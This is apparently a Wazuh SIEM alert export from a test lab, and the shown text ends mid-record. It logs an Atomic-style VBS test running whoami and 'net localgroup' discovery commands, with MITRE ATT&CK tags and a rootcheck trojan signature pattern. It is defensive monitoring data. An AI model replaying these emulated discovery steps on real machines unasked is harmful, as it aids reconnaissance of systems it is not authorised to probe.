wazuh-alerts-4.x-2024.12.10,0vRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
UtcTime: 2024-12-10 17:41:35.688
ProcessGuid: {15959494-7d4f-6758-1102-000000000300}
ProcessId: 6864
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: whoami
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: {15959494-7d4f-6758-1002-000000000300}
ParentProcessId: 7868
ParentImage: C:\Windows\System32\wscript.exe
ParentCommandLine: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\mari\AtomicTest.vbs"" 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:41:35.6896638Z,8628,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,4,Scripting interpreter spawned a new process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92000,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:36.494",EventChannel,1733852496,"Dec 10, 2024 @ 17:41:36.494", , , , , ,whoami.exe,C:\\Windows\\System32\\whoami.exe,Microsoft® Windows® Operating System, , ,whoami - displays logged on user information, , ,{15959494-7d4f-6758-1102-000000000300},6864,41:35.7,"SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","technique_id=T1033,technique_name=System Owner/User Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Visual Basic""]","[""T1059.005""]","[""Execution""]", , , , , , , , , , , ,{15959494-7d4f-6758-1002-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\WINDOWS\\System32\\WScript.exe\"" \""C:\\Users\\mari\\AtomicTest.vbs\""",0xeacdd,7868,C:\\Users\\mari\\,C:\\Windows\\System32\\wscript.exe,whoami,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,0_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T17:41:46.0965158Z,1034,764,DESKTOP-QGB4EQH,12544,716,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,9,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:46.856",EventChannel,1733852506,"Dec 10, 2024 @ 17:41:46.856", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x2b4, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,2vRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,2,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 10, 2024 @ 17:42:31.209",rootcheck,1733852551,"Dec 10, 2024 @ 17:42:31.209", , , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,/usr/bin/diff,Trojaned version of file detected.,Trojaned version of file '/usr/bin/diff' detected. Signature used: 'bash|^/bin/sh|file\.h|proc\.h|/dev/[^n]|^/bin/.*sh' (Generic)., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,3PRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Listened ports status (netstat) changed (new port opened or closed).,"[""ossec""]",533,ossec,log,"Dec 10, 2024 @ 17:42:34.949",netstat listening ports,1733852554,"Dec 10, 2024 @ 17:42:34.949", , , ,"[""IV_35.7.d""]","[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.2.7"",""10.6.1""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.14"",""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"Previous output:
ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 245/node
tcp 0.0.0.0:1514 0.0.0.0:* 1843/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 1720/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 1665/python3", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 245/node
tcp 0.0.0.0:1514 0.0.0.0:* 6109/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 5788/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 5739/python3", , , , , , , , , , , ,"ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 245/node
tcp 0.0.0.0:1514 0.0.0.0:* 1843/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 1720/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 1665/python3", , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,3vRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,3,Wazuh server started.,"[""ossec""]",502,ossec,log,"Dec 10, 2024 @ 17:42:43.944",wazuh-monitord,1733852563,"Dec 10, 2024 @ 17:42:43.944", , , ,"[""IV_35.7.d""]","[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]","[""164.312.b""]","[""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,ossec: Manager started., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,4fRRspMBtNh2X6vnUd_c,1,1,192.168.117.129,agent1,4,Maryam, , , ,16384,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-11T17:32:19Z. Reason: RulesEngine.""",0,2024-12-10T17:43:19.460159500Z,6572,0,DESKTOP-B37GATP,0,0,INFORMATION,Microsoft-Windows-Security-SPP,2,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 10, 2024 @ 17:43:19.252",EventChannel,1733852599,"Dec 10, 2024 @ 17:43:19.252","2024-12-11T17:32:19Z, RulesEngine", ,Software Protection Platform Service, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,4vRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:43:52.916
ProcessGuid: {15959494-7dd8-6758-3b02-000000000300}
ProcessId: 5748
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_seaqepbr.tak.ps1
CreationUtcTime: 2024-12-10 17:43:52.916
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:43:52.9291284Z,8799,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,3,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:43:53.605",EventChannel,1733852633,"Dec 10, 2024 @ 17:43:53.605", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7dd8-6758-3b02-000000000300},5748,43:52.9, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_seaqepbr.tak.ps1,43:52.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,5fRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1000,0x80000000000000, ,2,Application,0,"""Faulting application name: Calculator.exe, version: 10.2103.8.0, time stamp: 0x6062256a
Faulting module name: ucrtbase.dll, version: 10.0.19041.3636, time stamp: 0x81cf5d89
Exception code: 0xc0000409
Fault offset: 0x000000000007286e
Faulting process id: 0x15bc
Faulting application start time: 0x01db4b2a574750e1
Faulting application path: C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe\Calculator.exe
Faulting module path: C:\WINDOWS\System32\ucrtbase.dll
Report Id: dbe9f49d-1125-47c9-949c-7dcd3ef97132
Faulting package full name: Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe
Faulting package-relative application ID: App""",0,2024-12-10T17:44:11.7197314Z,388,0,DESKTOP-QGB4EQH,100,0,ERROR,Application Error,1,FALSE,9,Windows application error event.,"[""windows"",""windows_application"",""system_error""]",60602,windows_eventchannel,log,"Dec 10, 2024 @ 17:44:11.742",EventChannel,1733852651,"Dec 10, 2024 @ 17:44:11.742","Calculator.exe, 10.2103.8.0, 6062256a, ucrtbase.dll, 10.0.19041.3636, 81cf5d89, c0000409, 000000000007286e, 15bc, 01db4b2a574750e1, C:\\Program Files\\WindowsApps\\Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe\\Calculator.exe, C:\\WINDOWS\\System32\\ucrtbase.dll, dbe9f49d-1125-47c9-949c-7dcd3ef97132, Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe, App", , ,"[""IV_35.7.d""]","[""4.3""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,5vRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:44:14.700
ProcessGuid: {15959494-7dec-6758-5902-000000000300}
ProcessId: 1184
Image: C:\Windows\System32\taskhostw.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:44:14.7243483Z,8877,3884,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:44:15.471",EventChannel,1733852655,"Dec 10, 2024 @ 17:44:15.471", , , , , ,taskschd.dll,C:\\Windows\\System32\\taskhostw.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7dec-6758-5902-000000000300},1184,44:14.7,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,6PRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:45:55.090
ProcessGuid: {15959494-7e52-6758-5a02-000000000300}
ProcessId: 4972
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_iffzprkz.m0y.ps1
CreationUtcTime: 2024-12-10 17:45:55.090
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:45:55.1008094Z,8889,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,5,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:45:55.803",EventChannel,1733852755,"Dec 10, 2024 @ 17:45:55.803", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7e52-6758-5a02-000000000300},4972,45:55.1, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iffzprkz.m0y.ps1,45:55.1, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,6_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-12-10 17:46:00.220
ProcessGuid: {15959494-7e58-6758-6b02-000000000300}
ProcessId: 6712
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1  localgroup 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8
ParentProcessGuid: {15959494-7e58-6758-6a02-000000000300}
ParentProcessId: 7072
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:46:00.2248525Z,8927,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031,windows_eventchannel,log,"Dec 10, 2024 @ 17:46:00.652",EventChannel,1733852760,"Dec 10, 2024 @ 17:46:00.652", , , , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-7e58-6758-6b02-000000000300},6712,46:00.2,"SHA1=886622877AFB2F110ABFAAB79C107119A7E569AB,MD5=78E53D5AE8839C58FA40BEA32B775999,SHA256=E62071AA18768DD88ACAF97FA7B1F2FEC9FCCE89736C1EE9A800699328D196EA,IMPHASH=537AEF5B177E3302247DAB07A052B2D8","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , , , , , , , , , ,{15959494-7e58-6758-6a02-000000000300},{15959494-7b75-6758-ddac-0e0000000000},net  localgroup,0xeacdd,7072,C:\\Users\\mari\\,C:\\Windows\\System32\\net.exe,C:\\WINDOWS\\system32\\net1  localgroup,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,7vRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:46:48.049
ProcessGuid: {15959494-7e87-6758-6e02-000000000300}
ProcessId: 5212
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_h0qvbj2q.szd.ps1
CreationUtcTime: 2024-12-10 17:46:48.049
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:46:48.0566061Z,8938,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,6,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:46:48.789",EventChannel,1733852808,"Dec 10, 2024 @ 17:46:48.789", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7e87-6758-6e02-000000000300},5212,46:48.0, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_h0qvbj2q.szd.ps1,46:48.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,8fRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:46:58.041
ProcessGuid: {15959494-7e90-6758-8b02-000000000300}
ProcessId: 8504
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_qgz5kaeh.2ka.ps1
CreationUtcTime: 2024-12-10 17:46:58.041
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:46:58.0940395Z,9021,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,8,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:46:58.508",EventChannel,1733852818,"Dec 10, 2024 @ 17:46:58.508", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7e90-6758-8b02-000000000300},8504,46:58.0, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qgz5kaeh.2ka.ps1,46:58.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,8vRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1001,0x80000000000000, ,4,Application,0,"""Fault bucket 1541616759451971466, type 5
Event Name: RADAR_PRE_LEAK_64
Response: Not available
Cab Id: 0

Problem signature:
P1: SearchApp.exe
P2: 10.0.19041.5073
P3: 10.0.19045.2.0.0
P4: 
P5: 
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\Users\mari\AppData\Local\Temp\RDRABA.tmp\empty.txt
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERC12.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERD0D.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER1299.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER1375.tmp.txt

These files may be available here:


Analysis symbol: 
Rechecking for solution: 0
Report Id: 1400a246-3ebc-4c5a-bff8-9642f054237d
Report Status: 268435456
Hashed bucket: b5e519029d79d016d564ec465eec6f8a
